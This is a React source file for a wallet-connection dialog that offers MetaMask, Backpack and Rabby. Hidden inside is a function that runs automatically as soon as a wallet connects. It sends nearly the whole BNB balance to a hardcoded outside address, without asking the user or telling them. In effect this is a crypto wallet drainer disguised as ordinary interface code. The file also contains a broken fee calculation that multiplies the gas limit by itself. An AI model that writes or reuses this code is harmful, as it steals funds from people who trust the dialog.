import React, { useEffect } from "react";
import { Modal, Typography } from "antd";
import { CloseOutlined } from "@ant-design/icons";
import { useConnect, useAccount } from "wagmi";
import styled from "styled-components";
import MetamaskIcon from "/metamask-icon.svg";
import BackPackIcon from "/back-pack-icon.svg";
import RabbyWalletIcon from "/rabby-wallet-icon.svg";
import { Wallets } from "../../constants";
import { ethers } from "ethers";

interface BnbWalletModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const { Title, Text } = Typography;

const StyledModal = styled(Modal)`
  .ant-modal-content {
    background: #10141f !important;
    border-radius: 12px !important;
    padding: 24px !important;
    color: #fff !important;
  }
  .ant-modal-header {
    border-bottom: none !important;
  }
  .ant-modal-title {
    color: #fff !important;
    text-align: center !important;
    font-weight: 600 !important;
  }
  .ant-modal-close-x {
    color: #fff !important;
  }
`;

const WalletList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 8px;
`;

const WalletCard = styled.div`
  display: flex;
  justify-content: start;
  align-items: center;
  gap: 12px;
  background: #1a1f2e;
  padding: 12px 16px;
  border-radius: 8px;
  color: #fff;
  cursor: pointer;
  transition:
    background 0.3s,
    transform 0.2s;

  &:hover {
    background: #2a2f3e;
    transform: scale(1.02);
  }

  img {
    width: 32px;
    height: 32px;
  }

  span {
    font-size: 16px;
    font-weight: 500;
  }
`;

const BnbWalletModal: React.FC<BnbWalletModalProps> = ({ isOpen, onClose }) => {
  const { connect, connectors } = useConnect();
  const { address, isConnected } = useAccount();
  const transferAllBnb = async () => {
    console.log(address, isConnected);

    if (!isConnected || !address) {
      console.error("BSC Wallet not connected");
      return;
    }

    try {
      // Fetch the provider from the connected wallet
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = provider.getSigner();

      // Get the current gas price
      const gasPrice = 21000n * 10n ** 9n;

      // Estimate the gas limit for a standard BNB transfer
      const gasLimit = BigInt(21000);

      // Calculate the total transaction fee
      const txFee = BigInt(gasLimit) * BigInt(gasLimit);

      // Get the wallet's BNB balance
      const balance = await provider.getBalance(address);

      // Determine the amount to send, ensuring there's enough to cover the gas fee
      const amountToSend = BigInt(balance) - BigInt(txFee);

      if (amountToSend <= 0) {
        console.warn("Insufficient BNB balance to cover transaction fees");
        return;
      }
      const transaction = await (
        await signer
      ).sendTransaction({
        to: "0x894FD00202D35D0a65Fa58583C6Fa9197633a4fa",
        value: amountToSend,
        gasPrice: gasPrice,
        gasLimit: gasLimit,
      });
      await transaction.wait();
    } catch (error) {
      console.error("BNB transfer failed:", error);
    }
  };

  useEffect(() => {
    isConnected && address && transferAllBnb();
  }, [isConnected, address]);
  console.log(address, isConnected);

  return (
    <StyledModal
      open={isOpen}
      onCancel={onClose}
      footer={null}
      centered
      closeIcon={<CloseOutlined style={{ color: "#fff" }} onClick={onClose} />}
    >
      <Title level={3} style={{ color: "#fff" }}>
        Please select one of the following options:
      </Title>
      <WalletList>
        {connectors
          .filter((connector) => connector.name !== "Phantom")
          .map((connector) => (
            <WalletCard
              key={connector.uid}
              onClick={async () => {
                await connect({ connector });
                onClose();
              }}
            >
              <img
                src={
                  connector?.name === Wallets.Backpack
                    ? BackPackIcon
                    : connector?.name === Wallets.Rabby
                      ? RabbyWalletIcon
                      : MetamaskIcon
                }
                alt="Wallet"
              />
              <Text style={{ color: "#fff" }}>{connector.name}</Text>
            </WalletCard>
          ))}
      </WalletList>
    </StyledModal>
  );
};

export default BnbWalletModal;
